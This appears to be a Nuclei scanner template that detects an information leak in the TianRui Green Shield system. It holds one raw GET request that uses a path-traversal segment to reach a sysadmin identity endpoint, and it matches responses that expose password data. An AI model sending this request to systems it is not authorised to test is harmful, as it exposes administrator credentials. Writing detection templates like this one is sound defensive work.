id: TianRui-sysadmin-InfoLeak

info:
  name: TianRui Green Shield Information Leakage
  author: iSee857
  severity: high
  description: |
    Detects potential information leakage in TianRui Green Shield system by checking for sensitive data like 'password' and 'true' in the response body.
  tags: information-leakage, sensitive-info

http:
  - raw:
      - |
        GET /trwfe/service/../ws/identity/user/sysadmin HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "password"
          - "true"

      - type: status
        status:
          - 200